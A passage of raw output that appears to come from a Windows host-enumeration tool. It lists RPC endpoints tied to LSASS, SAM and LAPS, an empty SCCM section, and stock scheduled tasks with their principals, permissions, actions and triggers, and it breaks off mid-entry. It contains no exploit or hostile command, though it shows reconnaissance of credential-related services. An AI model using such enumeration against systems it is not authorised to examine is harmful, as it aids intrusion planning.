  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[clipsfk]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[imsfk]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncacn_np:[\\pipe\\lsass]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[audit]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[securityevent]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[LSARPC_ENDPOINT]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[lsacap]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[LSA_IDPEXT_ENDPOINT]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[LSA_EAS_ENDPOINT]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[lsapolicylookup]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[lsasspirpc]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[protected_storage]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[SidKey Local End Point]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[samss lpc]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[MicrosoftLaps_LRPC_0fb2f016-fe45-4a08-a7f9-a467f5e5fa0b]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncacn_ip_tcp:[49664]
  51a227ae-825b-41f2-b4a9-1ac9557a1018 v1.0 (Ngc Pop Key Service): ncalrpc:[NETLOGON_LRPC]
====== SCCM ======

  Server                         : 
  SiteCode                       : 
  ProductVersion                 : 
  LastSuccessfulInstallParams    : 

====== ScheduledTasks ======

Non Microsoft scheduled tasks (via WMI)

  Name                              :   .NET Framework NGEN v4.0.30319
  Principal                         :
      GroupId                       :   
      Id                            :   Author
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:(A;OICI;FA;;;BA)(A;OICI;FA;;;SY)(A;OICI;GR;;;AU)(A;;FRFX;;;LS)
  Enabled                           :   True
  Date                              :   9/30/2010 2:53:37 PM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT2H
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {84F0FAE1-C27B-4F6F-807B-28CF6F96287D}
      Data                          :   /RuntimeWide
      ------------------------------
  Triggers                          :
      ------------------------------

  Name                              :   .NET Framework NGEN v4.0.30319 64
  Principal                         :
      GroupId                       :   
      Id                            :   Author
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:(A;OICI;FA;;;BA)(A;OICI;FA;;;SY)(A;OICI;GR;;;AU)(A;;FRFX;;;LS)
  Enabled                           :   True
  Date                              :   9/30/2010 2:53:37 PM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT2H
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {429BC048-379E-45E0-80E4-EB1977941B5C}
      Data                          :   /RuntimeWide
      ------------------------------
  Triggers                          :
      ------------------------------

  Name                              :   .NET Framework NGEN v4.0.30319 64 Critical
  Principal                         :
      GroupId                       :   
      Id                            :   Author
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Disabled
  SDDL                              :   D:(A;OICI;FA;;;BA)(A;OICI;FA;;;SY)(A;OICI;GR;;;AU)(A;;FRFX;;;LS)
  Enabled                           :   False
  Date                              :   9/30/2010 2:53:37 PM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT2H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {613FBA38-A3DF-4AB8-9674-5604984A299A}
      Data                          :   /RuntimeWide
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskIdleTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   .NET Framework NGEN v4.0.30319 Critical
  Principal                         :
      GroupId                       :   
      Id                            :   Author
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Disabled
  SDDL                              :   D:(A;OICI;FA;;;BA)(A;OICI;FA;;;SY)(A;OICI;GR;;;AU)(A;;FRFX;;;LS)
  Enabled                           :   False
  Date                              :   9/30/2010 2:53:37 PM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT2H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {DE434264-8FE9-4C0B-A83B-89EBEEBFF78E}
      Data                          :   /RuntimeWide
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskIdleTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   Backup
  Principal                         :
      GroupId                       :   Users
      Id                            :   AnyUser
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   
  Author                            :   $(@%SystemRoot%\system32\AppListBackupLauncher.dll,-600)
  Description                       :   $(@%SystemRoot%\system32\AppListBackupLauncher.dll,-602)
  Source                            :   $(@%SystemRoot%\system32\AppListBackupLauncher.dll,-601)
  State                             :   Ready
  SDDL                              :   
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {E0DCC2CC-3354-45F2-8914-519E07809082}
      ------------------------------
  Triggers                          :
      ------------------------------

  Name                              :   BackupNonMaintenance
  Principal                         :
      GroupId                       :   Users
      Id                            :   AnyUser
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   
  Author                            :   $(@%SystemRoot%\system32\AppListBackupLauncher.dll,-600)
  Description                       :   $(@%SystemRoot%\system32\AppListBackupLauncher.dll,-602)
  Source                            :   $(@%SystemRoot%\system32\AppListBackupLauncher.dll,-601)
  State                             :   Ready
  SDDL                              :   
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {E0DCC2CC-3354-45F2-8914-519E07809082}
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskDailyTrigger
      Enabled                       :   True
      StartBoundary                 :   2022-01-01T00:00:00
      StopAtDurationEnd             :   False
      DaysInterval                  :   14
      RandomDelay                   :   PT4H
      ------------------------------

  Name                              :   Pre-staged app cleanup
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Disabled
  SDDL                              :   D:(A;;GA;;;SY)(A;;FRFX;;;LS)(A;;FA;;;BA)
  Enabled                           :   False
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT0S
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   %windir%\system32\AppxDeploymentClient.dll,AppxPreStageCleanupRunTask
      Execute                       :   %windir%\system32\rundll32.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskLogonTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      Delay                         :   PT1H
      ------------------------------

  Name                              :   BitLocker Encrypt All Drives
  Principal                         :
      GroupId                       :   INTERACTIVE
      Id                            :   Users
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:P(A;;FRFX;;;AU)(A;;FA;;;SY)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {61BCD1B9-340C-40EC-9D41-D7F1C0632F05}
      Data                          :   BitLockerEncryptAllDrives
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   BitLocker MDM policy Refresh
  Principal                         :
      GroupId                       :   INTERACTIVE
      Id                            :   Users
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:P(A;;FRFX;;;AU)(A;;FA;;;SY)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {61BCD1B9-340C-40EC-9D41-D7F1C0632F05}
      Data                          :   BitLockerPolicy
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   SyspartRepair
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:P(A;;FR;;;AU)(A;;FA;;;SY)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   %windir% /sysrepair
      Execute                       :   %windir%\system32\bcdboot.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   CreateObjectTask
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:(A;;FA;;;SY)(A;;FRFX;;;IU)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT1H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {E4544ABA-62BF-4C54-AAB2-EC246342626C}
      ------------------------------
  Triggers                          :
      ------------------------------

  Name                              :   UnifiedConsentSyncTask
  Principal                         :
      GroupId                       :   INTERACTIVE
      Id                            :   InteractiveUsers
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   
  Author                            :   $(@%systemRoot%\system32\unifiedconsent.dll,-102)
  Description                       :   $(@%systemRoot%\system32\unifiedconsent.dll,-101)
  Source                            :   $(@%systemRoot%\system32\unifiedconsent.dll,-103)
  State                             :   Ready
  SDDL                              :   
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT5M
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {82AA0895-198A-4C1B-B2D1-C16894218AFB}
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------
      Type                          :   MSFT_TaskTimeTrigger
      Enabled                       :   True
      StartBoundary                 :   2024-03-26T12:00:00
      Interval                      :   P1D
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   Device
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:(A;;GA;;;BA)(A;;GA;;;SY)(A;;FRFX;;;LS)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   P4D
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   SystemCxt
      Execute                       :   %windir%\system32\devicecensus.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTimeTrigger
      Enabled                       :   True
      StartBoundary                 :   2008-09-01T03:00:00
      Interval                      :   P1D
      StopAtDurationEnd             :   False
      RandomDelay                   :   PT2H
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   False
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   Device User
  Principal                         :
      GroupId                       :   INTERACTIVE
      Id                            :   Users
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:(A;;GA;;;BA)(A;;GA;;;SY)(A;;FRFX;;;LS)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   P4D
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   UserCxt
      Execute                       :   %windir%\system32\devicecensus.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskLogonTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      Delay                         :   PT2M
      ------------------------------

  Name                              :   DirectXDatabaseUpdater
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:(A;;FA;;;BA)(A;;FA;;;SY)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   False
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT2H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Execute                       :   %windir%\system32\directxdatabaseupdater.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskLogonTrigger
      Enabled                       :   False
      StopAtDurationEnd             :   False
      Delay                         :   PT10M
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   DXGIAdapterCache
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:(A;;FA;;;BA)(A;;FA;;;SY)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   False
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Execute                       :   %windir%\system32\dxgiadaptercache.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskBootTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      Delay                         :   PT1M
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   Diagnostics
  Principal                         :
      GroupId                       :   
      Id                            :   System
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT1H
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   -z
      Execute                       :   %windir%\system32\disksnapshot.exe
      ------------------------------
  Triggers                          :
      ------------------------------

  Name                              :   StorageSense
  Principal                         :
      GroupId                       :   
      Id                            :   System
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT1H
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {AB2A519B-03B0-43CE-940A-A73DF850B49A}
      ------------------------------
  Triggers                          :
      ------------------------------

  Name                              :   dusmtask
  Principal                         :
      GroupId                       :   INTERACTIVE
      Id                            :   Users
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:(A;;FA;;;SY)(A;;FA;;;BA)(A;;FA;;;S-1-5-80-4155767994-3874329934-3800885181-2130851812-726865888)(A;;FRFX;;;AU)(A;;FRFX;;;BU)(A;;FRFX;;;IU)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Execute                       :   %SystemRoot%\System32\dusmtask.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   EDP App Launch Task
  Principal                         :
      GroupId                       :   INTERACTIVE
      Id                            :   Users
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:P(A;;FRFX;;;AU)(A;;FA;;;SY)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {61BCD1B9-340C-40EC-9D41-D7F1C0632F05}
      Data                          :   AppLaunch
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   EDP Auth Task
  Principal                         :
      GroupId                       :   INTERACTIVE
      Id                            :   Users
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:P(A;;FRFX;;;AU)(A;;FA;;;SY)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {61BCD1B9-340C-40EC-9D41-D7F1C0632F05}
      Data                          :   ReAuth
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   EDP Inaccessible Credentials Task
  Principal                         :
      GroupId                       :   INTERACTIVE
      Id                            :   Users
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:P(A;;FRFX;;;AU)(A;;FA;;;SY)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {61BCD1B9-340C-40EC-9D41-D7F1C0632F05}
      Data                          :   MissingCredentials
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   StorageCardEncryption Task
  Principal                         :
      GroupId                       :   INTERACTIVE
      Id                            :   Users
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:P(A;;FRFX;;;AU)(A;;FA;;;SY)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {61BCD1B9-340C-40EC-9D41-D7F1C0632F05}
      Data                          :   SDCardEncryptionPolicy
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   InputSettingsRestoreDataAvailable
  Principal                         :
      GroupId                       :   INTERACTIVE
      Id                            :   Users
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:(A;;FA;;;AU)(A;;FA;;;BA)(A;;FA;;;SY)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT0S
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {378EAB97-EFD6-4ED5-9AD9-E64A6AA1E6FA}
      Data                          :   InputSettingsRestoreDataAvailable
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   LocalUserSyncDataAvailable
  Principal                         :
      GroupId                       :   INTERACTIVE
      Id                            :   Users
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:(A;;FA;;;AU)(A;;FA;;;BA)(A;;FA;;;SY)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT0S
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {8E7C2AFB-72B9-415C-9AC2-5037693309B7}
      Data                          :   LocalUserSyncDataAvailable
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   MouseSyncDataAvailable
  Principal                         :
      GroupId                       :   INTERACTIVE
      Id                            :   Users
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:(A;;FA;;;AU)(A;;FA;;;BA)(A;;FA;;;SY)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT0S
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {378EAB97-EFD6-4ED5-9AD9-E64A6AA1E6FA}
      Data                          :   MouseSyncDataAvailable
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   PenSyncDataAvailable
  Principal                         :
      GroupId                       :   INTERACTIVE
      Id                            :   Users
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:(A;;FA;;;AU)(A;;FA;;;BA)(A;;FA;;;SY)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT0S
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {378EAB97-EFD6-4ED5-9AD9-E64A6AA1E6FA}
      Data                          :   PenSyncDataAvailable
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   syncpensettings
  Principal                         :
      GroupId                       :   INTERACTIVE
      Id                            :   Users
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:(A;;FA;;;AU)(A;;FA;;;BA)(A;;FA;;;SY)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT1M
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {3ECEE215-83F5-4123-A592-74F1FE4C3D59}
      Data                          :   SYNC_PEN_SETTINGS
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   TouchpadSyncDataAvailable
  Principal                         :
      GroupId                       :   INTERACTIVE
      Id                            :   Users
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:(A;;FA;;;AU)(A;;FA;;;BA)(A;;FA;;;SY)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT0S
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {378EAB97-EFD6-4ED5-9AD9-E64A6AA1E6FA}
      Data                          :   TouchpadSyncDataAvailable
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   RestoreDevice
  Principal                         :
      GroupId                       :   INTERACTIVE
      Id                            :   AllUsers
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
